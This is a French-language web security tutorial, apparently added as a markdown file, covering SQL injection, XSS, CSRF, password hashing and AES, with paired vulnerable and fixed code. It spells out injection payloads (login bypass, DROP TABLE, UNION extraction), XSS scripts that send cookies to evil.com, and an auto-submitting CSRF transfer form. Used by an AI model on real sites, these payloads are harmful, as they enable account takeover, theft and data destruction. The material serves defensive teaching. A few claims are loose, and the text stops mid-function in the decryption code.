@@ -1,0 +1,2129 @@
+---
+title: "Securite des Applications"
+description: "Guide complet sur la securite des applications web et logicielles"
+category: "Qualite et Securite"
+tags: ["securite", "owasp", "injection", "xss"]
+difficulty: "Avance"
+---
+
+# Securite des Applications
+
+## Pourquoi la securite ?
+
+### Des chiffres qui font peur
+
+La securite informatique n'est pas un luxe. C'est une necessite absolue.
+
+- **Cout moyen d'une fuite de donnees en 2023** : 4,45 millions de dollars (source : IBM Cost of a Data Breach Report 2023).
+- **Yahoo (2013-2014)** : 3 milliards de comptes compromis. Mots de passe haches avec MD5 (obsolete). Le rachat par Verizon a ete negocie 350 millions de dollars de moins.
+- **Equifax (2017)** : 147 millions de personnes touchees (numeros de securite sociale, dates de naissance). Cause : une faille Apache Struts non corrigee depuis 2 mois. Amende de 700 millions de dollars.
+- **LinkedIn (2012)** : 6,5 millions de mots de passe haches avec SHA-1 sans sel, crackes en quelques heures. En 2016, on decouvre que le total etait de 117 millions de comptes.
+- **Adobe (2013)** : 153 millions de comptes. Mots de passe chiffres (pas haches) avec la meme cle, en mode ECB. Resultat : les mots de passe identiques produisaient le meme chiffre, rendant le dechiffrement trivial.
+
+Ces exemples ont un point commun : des erreurs de developpement basiques.
+
+### La responsabilite legale du developpeur
+
+Le RGPD (Reglement General sur la Protection des Donnees), en vigueur depuis mai 2018, impose des obligations strictes :
+
+- **Article 32** : le responsable de traitement doit mettre en oeuvre des mesures techniques et organisationnelles appropriees (chiffrement, pseudonymisation, tests reguliers).
+- **Sanctions** : jusqu'a 20 millions d'euros ou 4% du chiffre d'affaires annuel mondial, le montant le plus eleve etant retenu.
+- **Exemples de sanctions** : Google condamne a 50 millions d'euros par la CNIL (2019), Amazon a 746 millions d'euros par le Luxembourg (2021).
+
+Le developpeur n'est pas directement sanctionne par le RGPD (c'est le responsable de traitement), mais il engage sa responsabilite professionnelle. Un code vulnerable est une faute professionnelle.
+
+### Le principe fondamental : Never Trust User Input
+
+Toute donnee provenant de l'exterieur est potentiellement dangereuse :
+
+- Les champs de formulaire
+- Les parametres d'URL (query string)
+- Les en-tetes HTTP (cookies, User-Agent, Referer)
+- Les fichiers uploades
+- Les donnees provenant d'API tierces
+- Les donnees stockees en base de donnees (elles ont pu etre injectees par un attaquant)
+
+La regle : **valider, assainir et echapper** toute donnee avant de l'utiliser.
+
+---
+
+## Injection SQL
+
+### Le probleme
+
+L'injection SQL est classee premiere menace par l'OWASP depuis plus de 20 ans. Le principe est simple : l'attaquant insere du code SQL dans un champ de saisie, et ce code est execute par le serveur de base de donnees.
+
+Cela arrive quand le developpeur construit ses requetes SQL par concatenation de chaines avec des donnees utilisateur.
+
+### Comment ca marche : attaque pas a pas
+
+Prenons un formulaire de connexion classique. Le code serveur construit la requete ainsi :
+
+```sql
+SELECT * FROM users WHERE login = '$login' AND password = '$password'
+```
+
+L'utilisateur normal tape `jean` et `monmotdepasse`. La requete devient :
+
+```sql
+SELECT * FROM users WHERE login = 'jean' AND password = 'monmotdepasse'
+```
+
+Rien de mal. Maintenant, l'attaquant tape dans le champ login :
+
+```
+' OR 1=1 --
+```
+
+La requete devient :
+
+```sql
+SELECT * FROM users WHERE login = '' OR 1=1 --' AND password = ''
+```
+
+Decomposition :
+
+1. Le `'` ferme la chaine de caracteres du login.
+2. `OR 1=1` rend la condition toujours vraie.
+3. `--` est un commentaire SQL : tout ce qui suit est ignore, y compris la verification du mot de passe.
+
+Resultat : la requete retourne **tous les utilisateurs**. Le serveur connecte l'attaquant comme le premier utilisateur de la table (souvent l'administrateur).
+
+### Attaques encore pires
+
+**Suppression de table :**
+
+L'attaquant tape dans le champ login :
+
+```
+'; DROP TABLE users; --
+```
+
+La requete devient :
+
+```sql
+SELECT * FROM users WHERE login = ''; DROP TABLE users; --' AND password = ''
+```
+
+La table `users` est supprimee. L'application est hors service.
+
+**Extraction de donnees (UNION-based) :**
+
+```
+' UNION SELECT id, login, password, email FROM users --
+```
+
+L'attaquant recupere l'integralite de la table utilisateurs, y compris les mots de passe (haches ou non).
+
+**Injection aveugle (blind SQL injection) :**
+
+Quand l'application n'affiche pas les resultats de la requete, l'attaquant pose des questions vrai/faux :
+
+```
+' AND (SELECT LENGTH(password) FROM users WHERE login='admin') > 10 --
+```
+
+Si la page se charge normalement, le mot de passe fait plus de 10 caracteres. Sinon, 10 ou moins. En repetant avec des valeurs differentes, l'attaquant reconstruit le mot de passe caractere par caractere.
+
+### LA SOLUTION : requetes preparees (parametrees)
+
+Le principe : separer le code SQL des donnees. Le moteur SQL recoit d'abord la structure de la requete, puis les valeurs. Les valeurs ne sont jamais interpretees comme du code.
+
+#### JavaScript (mysql2)
+
+**Code VULNERABLE :**
+
+```javascript
+const mysql = require('mysql2');
+const connection = mysql.createConnection({
+  host: 'localhost',
+  user: 'root',
+  password: 'secret',
+  database: 'monapp'
+});
+
+app.post('/login', (req, res) => {
+  const login = req.body.login;
+  const password = req.body.password;
+
+  // DANGER : concatenation directe
+  const sql = "SELECT * FROM users WHERE login = '" + login
+    + "' AND password = '" + password + "'";
+
+  connection.query(sql, (err, results) => {
+    if (results.length > 0) {
+      res.send('Connecte');
+    } else {
+      res.send('Echec');
+    }
+  });
+});
+```
+
+**Code CORRIGE :**
+
+```javascript
+const mysql = require('mysql2');
+const connection = mysql.createConnection({
+  host: 'localhost',
+  user: 'root',
+  password: 'secret',
+  database: 'monapp'
+});
+
+app.post('/login', (req, res) => {
+  const login = req.body.login;
+  const password = req.body.password;
+
+  // Requete preparee : les ? sont des emplacements pour les valeurs
+  const sql = 'SELECT * FROM users WHERE login = ? AND password = ?';
+
+  connection.execute(sql, [login, password], (err, results) => {
+    if (results.length > 0) {
+      res.send('Connecte');
+    } else {
+      res.send('Echec');
+    }
+  });
+});
+```
+
+Avec `execute`, meme si l'utilisateur tape `' OR 1=1 --`, cette chaine est traitee comme une valeur litterale, pas comme du code SQL. La requete cherche un utilisateur dont le login est exactement la chaine `' OR 1=1 --`.
+
+#### C# (MySqlCommand avec MySql.Data)
+
+**Code VULNERABLE :**
+
+```csharp
+using MySql.Data.MySqlClient;
+
+public bool VerifierLogin(string login, string password)
+{
+    string connectionString = "Server=localhost;Database=monapp;Uid=root;Pwd=secret;";
+    using (var connection = new MySqlConnection(connectionString))
+    {
+        connection.Open();
+
+        // DANGER : concatenation directe
+        string sql = "SELECT * FROM users WHERE login = '" + login
+            + "' AND password = '" + password + "'";
+
+        using (var command = new MySqlCommand(sql, connection))
+        {
+            using (var reader = command.ExecuteReader())
+            {
+                return reader.HasRows;
+            }
+        }
+    }
+}
+```
+
+**Code CORRIGE :**
+
+```csharp
+using MySql.Data.MySqlClient;
+
+public bool VerifierLogin(string login, string password)
+{
+    string connectionString = "Server=localhost;Database=monapp;Uid=root;Pwd=secret;";
+    using (var connection = new MySqlConnection(connectionString))
+    {
+        connection.Open();
+
+        // Requete parametree avec @param
+        string sql = "SELECT * FROM users WHERE login = @login AND password = @password";
+
+        using (var command = new MySqlCommand(sql, connection))
+        {
+            command.Parameters.AddWithValue("@login", login);
+            command.Parameters.AddWithValue("@password", password);
+
+            using (var reader = command.ExecuteReader())
+            {
+                return reader.HasRows;
+            }
+        }
+    }
+}
+```
+
+### Protections complementaires
+
+1. **Validation d'entree** : verifier le format attendu. Un login ne devrait contenir que des lettres, chiffres et quelques caracteres speciaux. Rejeter tout le reste avant meme de toucher la base.
+
+```javascript
+// Validation basique d'un login
+const loginRegex = /^[a-zA-Z0-9_]{3,30}$/;
+if (!loginRegex.test(login)) {
+  return res.status(400).send('Login invalide');
+}
+```
+
+```csharp
+// Validation basique d'un login
+var loginRegex = new System.Text.RegularExpressions.Regex(@"^[a-zA-Z0-9_]{3,30}$");
+if (!loginRegex.IsMatch(login))
+{
+    throw new ArgumentException("Login invalide");
+}
+```
+
+2. **Principe du moindre privilege** : l'utilisateur de base de donnees utilise par l'application ne doit avoir que les droits necessaires (SELECT, INSERT, UPDATE sur les tables utiles). Jamais DROP, ALTER, ou GRANT. Ainsi, meme en cas d'injection reussie, l'attaquant ne peut pas supprimer de table.
+
+3. **ORM (Object-Relational Mapping)** : des outils comme Sequelize (JavaScript) ou Entity Framework (C#) generent des requetes parametrees automatiquement.
+
+---
+
+## Cross-Site Scripting (XSS)
+
+### Le probleme
+
+L'attaquant injecte du code JavaScript dans une page web. Ce code est ensuite execute par le navigateur des autres utilisateurs qui visitent cette page. Le navigateur ne fait pas la difference entre le JavaScript legitime de l'application et celui injecte par l'attaquant.
+
+### Les trois types de XSS
+
+#### XSS Reflechi (Reflected XSS)
+
+Le code malveillant est dans l'URL. Il n'est pas stocke sur le serveur.
+
+Exemple : une page de recherche qui affiche le terme recherche.
+
+```
+https://site.com/recherche?q=<script>alert('XSS')</script>
+```
+
+Si le serveur renvoie la page avec :
+
+```html
+<p>Resultats pour : <script>alert('XSS')</script></p>
+```
+
+Le script s'execute dans le navigateur. L'attaquant envoie ce lien piege a sa victime par email ou messagerie.
+
+#### XSS Stocke (Stored XSS)
+
+Le code malveillant est enregistre en base de donnees. C'est le plus dangereux car il touche tous les visiteurs.
+
+Exemple : un forum ou les commentaires sont affiches sans filtrage.
+
+L'attaquant poste comme commentaire :
+
+```html
+<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+```
+
+Ce commentaire est sauvegarde en base. Chaque visiteur qui affiche la page du forum execute le script. Leur cookie de session est envoye au serveur de l'attaquant. Avec ce cookie, l'attaquant peut usurper l'identite de chaque victime.
+
+#### XSS DOM-based
+
+Le code malveillant manipule le DOM (Document Object Model) directement cote client, sans passer par le serveur.
+
+Exemple : un script JavaScript qui lit un parametre de l'URL et l'injecte dans la page.
+
+```javascript
+// Code vulnerable
+const nom = new URLSearchParams(window.location.search).get('nom');
+document.getElementById('bienvenue').innerHTML = 'Bonjour ' + nom;
+```
+
+L'attaquant forge l'URL :
+
+```
+https://site.com/profil?nom=<img src=x onerror="alert(document.cookie)">
+```
+
+Le navigateur execute le code dans l'attribut `onerror`.
+
+### Exemple d'attaque detaille : vol de session
+
+1. Le site `forum.com` affiche les commentaires sans echappement.
+2. L'attaquant poste ce commentaire :
+
+```html
+Super article !
+<script>
+  var img = new Image();
+  img.src = 'https://evil.com/collect?cookie=' + encodeURIComponent(document.cookie);
+</script>
+```
+
+3. Alice visite la page. Son navigateur execute le script. Une requete est envoyee a `evil.com` avec le cookie de session d'Alice.
+4. L'attaquant recupere le cookie : `session_id=abc123def456`.
+5. L'attaquant configure son propre navigateur avec ce cookie.
+6. L'attaquant est maintenant connecte comme Alice. Il peut lire ses messages prives, modifier son profil, effectuer des actions en son nom.
+
+### SOLUTIONS
+
+#### 1. Echappement HTML
+
+Le principe : transformer les caracteres speciaux HTML en entites inoffensives.
+
+| Caractere | Entite HTML |
+|-----------|-------------|
+| `<`       | `&lt;`      |
+| `>`       | `&gt;`      |
+| `&`       | `&amp;`     |
+| `"`       | `&quot;`    |
+| `'`       | `&#x27;`    |
+
+Ainsi, `<script>` devient `&lt;script&gt;` et est affiche comme du texte, pas execute comme du code.
+
+**JavaScript : code VULNERABLE**
+
+```javascript
+app.get('/recherche', (req, res) => {
+  const terme = req.query.q;
+
+  // DANGER : injection directe dans le HTML
+  res.send(`<h1>Resultats pour : ${terme}</h1>`);
+});
+```
+
+**JavaScript : code CORRIGE (methode manuelle)**
+
+```javascript
+function echapperHtml(texte) {
+  return texte
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+
+app.get('/recherche', (req, res) => {
+  const terme = echapperHtml(req.query.q);
+  res.send(`<h1>Resultats pour : ${terme}</h1>`);
+});
+```
+
+**JavaScript : code CORRIGE (avec un moteur de template)**
+
+Avec EJS, Handlebars ou Pug, l'echappement est automatique :
+
+```javascript
+// Avec EJS : la syntaxe <%= %> echappe automatiquement
+// recherche.ejs
+// <h1>Resultats pour : <%= terme %></h1>
+
+app.get('/recherche', (req, res) => {
+  res.render('recherche', { terme: req.query.q });
+});
+```
+
+Attention : la syntaxe `<%- %>` (avec un tiret) n'echappe PAS. Ne jamais l'utiliser avec des donnees utilisateur.
+
+**JavaScript : cote client, utiliser textContent**
+
+```javascript
+// VULNERABLE
+document.getElementById('resultat').innerHTML = donneeUtilisateur;
+
+// CORRIGE
+document.getElementById('resultat').textContent = donneeUtilisateur;
+```
+
+`textContent` traite le contenu comme du texte brut, jamais comme du HTML.
+
+**C# (ASP.NET MVC) : code VULNERABLE**
+
+```csharp
+public IActionResult Recherche(string q)
+{
+    // DANGER : injection directe dans le HTML via ViewBag
+    ViewBag.Terme = q;
+    return View();
+}
+
+// Dans la vue Razor :
+// <h1>Resultats pour : @Html.Raw(ViewBag.Terme)</h1>
+```
+
+`Html.Raw` affiche le contenu tel quel, sans echappement.
+
+**C# : code CORRIGE**
+
+```csharp
+public IActionResult Recherche(string q)
+{
+    ViewBag.Terme = q;
+    return View();
+}
+
+// Dans la vue Razor :
+// <h1>Resultats pour : @ViewBag.Terme</h1>
+```
+
+En Razor, la syntaxe `@variable` echappe automatiquement le HTML. Il suffit de ne pas utiliser `Html.Raw`.
+
+Pour un echappement explicite dans le code C# :
+
+```csharp
+using System.Web;
+
+string texteSecurise = HttpUtility.HtmlEncode(donneeUtilisateur);
+```
+
+#### 2. Content Security Policy (CSP)
+
+Un en-tete HTTP qui indique au navigateur quels scripts il a le droit d'executer.
+
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'
+```
+
+Cette politique interdit l'execution de tout script inline (directement dans le HTML) et de tout script provenant d'un domaine externe. Meme si un attaquant reussit a injecter du HTML, le navigateur refuse d'executer le script.
+
+En Express.js :
+
+```javascript
+app.use((req, res, next) => {
+  res.setHeader(
+    'Content-Security-Policy',
+    "default-src 'self'; script-src 'self'"
+  );
+  next();
+});
+```
+
+En C# (ASP.NET) :
+
+```csharp
+app.Use(async (context, next) =>
+{
+    context.Response.Headers.Append(
+        "Content-Security-Policy",
+        "default-src 'self'; script-src 'self'"
+    );
+    await next();
+});
+```
+
+#### 3. Cookies HttpOnly
+
+Un cookie marque `HttpOnly` ne peut pas etre lu par JavaScript. Meme si un script XSS s'execute, `document.cookie` ne contient pas le cookie de session.
+
+```javascript
+// Express.js
+app.use(session({
+  secret: 'cle-secrete',
+  cookie: {
+    httpOnly: true,   // Le cookie n'est pas accessible en JavaScript
+    secure: true,     // Le cookie n'est envoye qu'en HTTPS
+    sameSite: 'strict' // Protection contre le CSRF (voir section suivante)
+  }
+}));
+```
+
+#### 4. Validation et sanitisation des entrees
+
+En complement de l'echappement en sortie, valider les entrees en amont.
+
+```javascript
+const validator = require('validator');
+
+app.post('/commentaire', (req, res) => {
+  let commentaire = req.body.commentaire;
+
+  // Supprimer les balises HTML
+  commentaire = validator.stripLow(commentaire);
+  commentaire = validator.escape(commentaire);
+
+  // Enregistrer en base le commentaire assaini
+  enregistrerCommentaire(commentaire);
+});
+```
+
+---
+
+## Cross-Site Request Forgery (CSRF)
+
+### Le probleme
+
+L'attaquant force un utilisateur authentifie a executer une action a son insu. L'attaque exploite le fait que le navigateur envoie automatiquement les cookies avec chaque requete vers un domaine.
+
+### Exemple d'attaque pas a pas
+
+1. Alice est connectee a `banque.com`. Son navigateur possede un cookie de session valide.
+2. Alice visite `site-malveillant.com` (lien recu par email, publicite, etc.).
+3. La page malveillante contient :
+
+```html
+<!-- Requete GET invisible -->
+<img src="https://banque.com/virement?montant=5000&vers=PIRATE123" style="display:none">
+
+<!-- Ou un formulaire POST automatique -->
+<form action="https://banque.com/virement" method="POST" id="form">
+  <input type="hidden" name="montant" value="5000">
+  <input type="hidden" name="vers" value="PIRATE123">
+</form>
+<script>document.getElementById('form').submit();</script>
+```
+
+4. Le navigateur d'Alice envoie la requete a `banque.com` avec ses cookies de session.
+5. Le serveur de la banque recoit une requete authentifiee et execute le virement.
+
+Alice n'a rien vu. Elle n'a meme pas clique sur quoi que ce soit.
+
+### SOLUTIONS
+
+#### 1. Token CSRF
+
+Le principe : inclure un jeton unique et imprevisible dans chaque formulaire. Le serveur verifie que le jeton est present et valide avant de traiter la requete. Le site malveillant ne peut pas connaitre ce jeton.
+
+**JavaScript (Express.js avec csurf) :**
+
+```javascript
+const express = require('express');
+const session = require('express-session');
+const csrf = require('csurf');
+
+const app = express();
+
+app.use(express.urlencoded({ extended: false }));
+app.use(session({
+  secret: 'cle-secrete-session',
+  resave: false,
+  saveUninitialized: false,
+  cookie: { httpOnly: true, secure: true }
+}));
+
+// Middleware CSRF
+const csrfProtection = csrf();
+
+// Afficher le formulaire avec le token
+app.get('/virement', csrfProtection, (req, res) => {
+  res.send(`
+    <form action="/virement" method="POST">
+      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
+      <label>Montant : <input type="text" name="montant"></label>
+      <label>Destinataire : <input type="text" name="destinataire"></label>
+      <button type="submit">Envoyer</button>
+    </form>
+  `);
+});
+
+// Traiter le formulaire (le middleware verifie automatiquement le token)
+app.post('/virement', csrfProtection, (req, res) => {
+  // Si le token est invalide ou absent, csurf renvoie une erreur 403
+  effectuerVirement(req.body.montant, req.body.destinataire);
+  res.send('Virement effectue');
+});
+
+// Gestion de l'erreur CSRF
+app.use((err, req, res, next) => {
+  if (err.code === 'EBADCSRFTOKEN') {
+    return res.status(403).send('Token CSRF invalide. Requete rejetee.');
+  }
+  next(err);
+});
+
+app.listen(3000);
+```
+
+**C# (ASP.NET MVC) :**
+
+Dans la vue Razor :
+
+```html
+<form asp-action="Virement" method="post">
+    @Html.AntiForgeryToken()
+    <label>Montant : <input type="text" name="montant" /></label>
+    <label>Destinataire : <input type="text" name="destinataire" /></label>
+    <button type="submit">Envoyer</button>
+</form>
+```
+
+Dans le controleur :
+
+```csharp
+[HttpPost]
+[ValidateAntiForgeryToken] // Verifie automatiquement le token
+public IActionResult Virement(string montant, string destinataire)
+{
+    EffectuerVirement(montant, destinataire);
+    return Content("Virement effectue");
+}
+```
+
+#### 2. Attribut SameSite sur les cookies
+
+```
+Set-Cookie: session_id=abc123; SameSite=Strict; HttpOnly; Secure
+```
+
+- `SameSite=Strict` : le cookie n'est jamais envoye lors de requetes provenant d'un autre site. Protection maximale mais peut bloquer des cas legitimes (lien depuis un email).
+- `SameSite=Lax` : le cookie est envoye pour les navigations de haut niveau (clic sur un lien) mais pas pour les requetes automatiques (formulaires POST, images, iframes). Bon compromis.
+- `SameSite=None` : aucune restriction. A utiliser uniquement avec `Secure`.
+
+#### 3. Verification de l'en-tete Origin/Referer
+
+Le serveur peut verifier que la requete provient bien de son propre domaine :
+
+```javascript
+app.post('/virement', (req, res) => {
+  const origin = req.get('Origin');
+  if (origin !== 'https://banque.com') {
+    return res.status(403).send('Origine non autorisee');
+  }
+  // Traiter la requete
+});
+```
+
+Cette protection est complementaire, pas suffisante seule (les en-tetes peuvent etre absents dans certains cas).
+
+---
+
+## Hachage (Hash)
+
+### Qu'est-ce qu'un hash ?
+
+Un hash est le resultat d'une fonction mathematique a sens unique. On donne une entree, on obtient une empreinte de taille fixe. L'operation est irreversible : a partir du hash, on ne peut pas retrouver l'entree originale.
+
+Analogie : un hachoir a viande. On peut transformer un morceau de viande en viande hachee, mais on ne peut pas reconstruire le morceau de viande a partir de la viande hachee.
+
+### Proprietes d'une bonne fonction de hachage
+
+1. **Deterministe** : la meme entree produit toujours le meme hash.
+2. **Rapide a calculer** : le hash d'une donnee est obtenu en un temps raisonnable.
+3. **Irreversible** (pre-image resistance) : a partir du hash, il est impossible de retrouver l'entree.
+4. **Resistant aux collisions** : il est extremement improbable que deux entrees differentes produisent le meme hash.
+5. **Effet avalanche** : un changement minime de l'entree modifie radicalement le hash.
+
+Exemples avec SHA-256 :
+
+```
+"bonjour"  -> d30a2c9e...  (64 caracteres hexadecimaux)
+"Bonjour"  -> 963d4ae8...  (completement different pour un seul caractere change)
+"bonjour " -> 7f2c41ba...  (un espace ajoute change tout)
+```
+
+### Utilisation principale : stocker les mots de passe
+
+Quand un utilisateur cree un compte, on ne stocke jamais son mot de passe en clair. On stocke le hash de son mot de passe. Lors de la connexion, on hache le mot de passe saisi et on compare les deux hashs.
+
+```
+Inscription :
+  Mot de passe "secret123" -> hash -> "$2b$10$xK..." -> stocke en BDD
+
+Connexion :
+  Mot de passe saisi "secret123" -> hash -> "$2b$10$xK..." -> compare avec la BDD -> identique -> acces autorise
+  Mot de passe saisi "mauvais"   -> hash -> "$2b$10$yQ..." -> compare avec la BDD -> different -> acces refuse
+```
+
+### Pourquoi ne jamais stocker les mots de passe en clair
+
+Si la base de donnees est compromise (et cela arrive), les consequences sont radicalement differentes :
+
+| Stockage | Consequence d'une fuite |
+|----------|------------------------|
+| En clair | L'attaquant a tous les mots de passe immediatement. Comme 65% des gens reutilisent leurs mots de passe, il peut tester ces identifiants sur d'autres sites. |
+| Hash MD5 sans sel | L'attaquant utilise des rainbow tables (tables precalculees) et retrouve la plupart des mots de passe en quelques minutes. |
+| Hash bcrypt avec sel | L'attaquant doit brute-forcer chaque hash individuellement. Avec un cout de 10, chaque tentative prend environ 100ms. Pour un mot de passe de 8 caracteres avec chiffres et lettres, il faut des milliers d'annees. |
+
+### Les algorithmes
+
+#### MD5 : OBSOLETE
+
+- Produit un hash de 128 bits (32 caracteres hexadecimaux).
+- Des collisions ont ete trouvees des 2004 (deux entrees differentes produisant le meme hash).
+- Beaucoup trop rapide : une carte graphique moderne peut calculer des milliards de hash MD5 par seconde.
+- **Ne plus jamais utiliser pour les mots de passe.**
+
+#### SHA-256 : insuffisant seul
+
+- Produit un hash de 256 bits (64 caracteres hexadecimaux).
+- Pas de collisions connues.
+- Mais trop rapide pour les mots de passe : des milliards de hashs par seconde avec un GPU.
+- Acceptable pour verifier l'integrite d'un fichier, pas pour stocker des mots de passe.
+
+#### bcrypt : le standard
+
+- Concu specifiquement pour le hachage de mots de passe.
+- Integre automatiquement un sel (salt) aleatoire.
+- Possede un facteur de cout (cost factor) reglable : on peut rendre le calcul plus lent au fil du temps quand les machines deviennent plus rapides.
+- Avec un cout de 10, environ 100ms par hash. Avec un cout de 12, environ 300ms. C'est assez rapide pour la connexion d'un utilisateur, mais bien trop lent pour une attaque par brute force.
+
+Format d'un hash bcrypt :
+
+```
+$2b$10$xK3RZ3J5p1V2W3X4Y5Z6aObcdeFGHIJklmnoPQRSTuvwxYZ012345
+
+$2b  = version de l'algorithme
+$10  = facteur de cout (2^10 = 1024 iterations)
+xK3RZ3J5p1V2W3X4Y5Z6aO = sel (22 caracteres)
+bcdeFGHIJklmnoPQRSTuvwxYZ012345 = hash (31 caracteres)
+```
+
+#### Argon2 : le plus recent
+
+- Gagnant de la Password Hashing Competition en 2015.
+- Configurable en memoire, en temps et en parallelisme.
+- Resiste aux attaques par GPU et ASIC grace a sa consommation memoire.
+- Recommande par l'OWASP pour les nouveaux projets.
+- Trois variantes : Argon2d (resistance GPU), Argon2i (resistance side-channel), Argon2id (hybride, recommande).
+
+### Le sel (salt)
+
+Un sel est une valeur aleatoire unique ajoutee au mot de passe avant le hachage.
+
+**Sans sel :**
+
+```
+"motdepasse" -> SHA-256 -> "5e884898da..."
+```
+
+Tous les utilisateurs ayant le meme mot de passe auront le meme hash. Un attaquant peut utiliser une rainbow table (table precalculee de millions de mots de passe et leurs hashs) pour retrouver les mots de passe instantanement.
+
+**Avec sel :**
+
+```
+"motdepasse" + sel "a3f7b2" -> SHA-256 -> "9c1d7e..."
+"motdepasse" + sel "x8k2m9" -> SHA-256 -> "f4a8b3..."
+```
+
+Meme mot de passe, hashs differents. Les rainbow tables sont inutiles car il faudrait en precalculer une par sel possible.
+
+Avec bcrypt, le sel est genere et integre automatiquement. Pas besoin de le gerer manuellement.
+
+### Code complet
+
+#### JavaScript (bcrypt)
+
+```javascript
+const bcrypt = require('bcrypt');
+
+// --- INSCRIPTION ---
+async function inscrireUtilisateur(login, motDePasse) {
+  // Generer le hash (le sel est cree automatiquement)
+  // 10 = facteur de cout (nombre de rounds = 2^10)
+  const hash = await bcrypt.hash(motDePasse, 10);
+
+  // Stocker en base : le hash contient deja le sel
+  await db.execute(
+    'INSERT INTO users (login, password_hash) VALUES (?, ?)',
+    [login, hash]
+  );
+
+  console.log('Hash stocke :', hash);
+  // Exemple : $2b$10$xK3RZ3J5p1V2W3X4Y5Z6aObcdeFGHIJ...
+}
+
+// --- CONNEXION ---
+async function verifierConnexion(login, motDePasse) {
+  // Recuperer le hash stocke en base
+  const [rows] = await db.execute(
+    'SELECT password_hash FROM users WHERE login = ?',
+    [login]
+  );
+
+  if (rows.length === 0) {
+    return false; // Utilisateur inexistant
+  }
+
+  const hashStocke = rows[0].password_hash;
+
+  // Comparer le mot de passe saisi avec le hash stocke
+  // bcrypt.compare extrait le sel du hash et recalcule
+  const correspond = await bcrypt.compare(motDePasse, hashStocke);
+
+  return correspond; // true ou false
+}
+
+// Utilisation
+inscrireUtilisateur('alice', 'MonMotDePasse123!');
+const estValide = await verifierConnexion('alice', 'MonMotDePasse123!');
+console.log(estValide); // true
+```
+
+#### C# (BCrypt.Net-Next)
+
+Installation du package NuGet : `BCrypt.Net-Next`
+
+```csharp
+using BCrypt.Net;
+using MySql.Data.MySqlClient;
+
+public class GestionUtilisateurs
+{
+    private string connectionString = "Server=localhost;Database=monapp;Uid=root;Pwd=secret;";
+
+    // --- INSCRIPTION ---
+    public void InscrireUtilisateur(string login, string motDePasse)
+    {
+        // Generer le hash avec sel automatique (workFactor = 10 par defaut)
+        string hash = BCrypt.Net.BCrypt.HashPassword(motDePasse, workFactor: 10);
+
+        using (var connection = new MySqlConnection(connectionString))
+        {
+            connection.Open();
+            string sql = "INSERT INTO users (login, password_hash) VALUES (@login, @hash)";
+
+            using (var command = new MySqlCommand(sql, connection))
+            {
+                command.Parameters.AddWithValue("@login", login);
+                command.Parameters.AddWithValue("@hash", hash);
+                command.ExecuteNonQuery();
+            }
+        }
+
+        Console.WriteLine("Hash stocke : " + hash);
+    }
+
+    // --- CONNEXION ---
+    public bool VerifierConnexion(string login, string motDePasse)
+    {
+        using (var connection = new MySqlConnection(connectionString))
+        {
+            connection.Open();
+            string sql = "SELECT password_hash FROM users WHERE login = @login";
+
+            using (var command = new MySqlCommand(sql, connection))
+            {
+                command.Parameters.AddWithValue("@login", login);
+
+                using (var reader = command.ExecuteReader())
+                {
+                    if (!reader.Read())
+                    {
+                        return false; // Utilisateur inexistant
+                    }
+
+                    string hashStocke = reader.GetString("password_hash");
+
+                    // Comparer le mot de passe saisi avec le hash stocke
+                    return BCrypt.Net.BCrypt.Verify(motDePasse, hashStocke);
+                }
+            }
+        }
+    }
+}
+
+// Utilisation
+var gestion = new GestionUtilisateurs();
+gestion.InscrireUtilisateur("alice", "MonMotDePasse123!");
+bool estValide = gestion.VerifierConnexion("alice", "MonMotDePasse123!");
+Console.WriteLine(estValide); // True
+```
+
+#### C# : SHA-256 avec sel (pour comprendre le mecanisme)
+
+Ce code illustre le principe du sel. En production, utiliser bcrypt.
+
+```csharp
+using System.Security.Cryptography;
+using System.Text;
+
+public class HashAvecSel
+{
+    public static (string hash, string sel) Hacher(string motDePasse)
+    {
+        // Generer un sel aleatoire de 16 octets
+        byte[] selBytes = RandomNumberGenerator.GetBytes(16);
+        string sel = Convert.ToBase64String(selBytes);
+
+        // Combiner mot de passe + sel et hacher
+        byte[] combinaison = Encoding.UTF8.GetBytes(motDePasse + sel);
+        byte[] hashBytes = SHA256.HashData(combinaison);
+        string hash = Convert.ToHexString(hashBytes);
+
+        return (hash, sel);
+    }
+
+    public static bool Verifier(string motDePasse, string hashStocke, string sel)
+    {
+        byte[] combinaison = Encoding.UTF8.GetBytes(motDePasse + sel);
+        byte[] hashBytes = SHA256.HashData(combinaison);
+        string hashCalcule = Convert.ToHexString(hashBytes);
+
+        return hashCalcule == hashStocke;
+    }
+}
+```
+
+---
+
+## Chiffrement (Cryptage)
+
+### Difference entre hash et chiffrement
+
+| | Hash | Chiffrement |
+|---|------|-------------|
+| Reversible ? | Non | Oui (avec la cle) |
+| Utilisation | Verifier l'integrite, stocker des mots de passe | Proteger la confidentialite des donnees |
+| Taille de sortie | Fixe (256 bits pour SHA-256) | Variable (depend de la taille de l'entree) |
+| Cle necessaire ? | Non | Oui |
+
+Le hash est a sens unique. Le chiffrement est reversible si on possede la cle.
+
+### Chiffrement symetrique : une seule cle (AES)
+
+Le meme secret (la cle) sert a chiffrer et a dechiffrer.
+
+Analogie : un coffre-fort avec une seule cle. Quiconque possede la cle peut ouvrir le coffre et y deposer quelque chose.
+
+**AES (Advanced Encryption Standard)** est le standard actuel. Tailles de cle : 128, 192 ou 256 bits.
+
+Le probleme du chiffrement symetrique : comment transmettre la cle de maniere securisee ? Si on l'envoie en clair sur le reseau, un attaquant peut l'intercepter.
+
+#### Code : chiffrement AES en JavaScript
+
+```javascript
+const crypto = require('crypto');
+
+// Chiffrement AES-256-CBC
+function chiffrer(texte, cleSecrete) {
+  // Generer un IV (vecteur d'initialisation) aleatoire de 16 octets
+  // L'IV garantit que chiffrer le meme texte deux fois donne un resultat different
+  const iv = crypto.randomBytes(16);
+
+  // Deriver une cle de 32 octets a partir du secret
+  const cle = crypto.scryptSync(cleSecrete, 'sel-application', 32);
+
+  // Creer le chiffreur
+  const cipher = crypto.createCipheriv('aes-256-cbc', cle, iv);
+
+  // Chiffrer
+  let chiffre = cipher.update(texte, 'utf8', 'hex');
+  chiffre += cipher.final('hex');
+
+  // Retourner l'IV + le texte chiffre (l'IV n'est pas secret)
+  return iv.toString('hex') + ':' + chiffre;
+}
+
+function dechiffrer(donneeChiffree, cleSecrete) {
+  // Separer l'IV du texte chiffre
+  const parties = donneeChiffree.split(':');
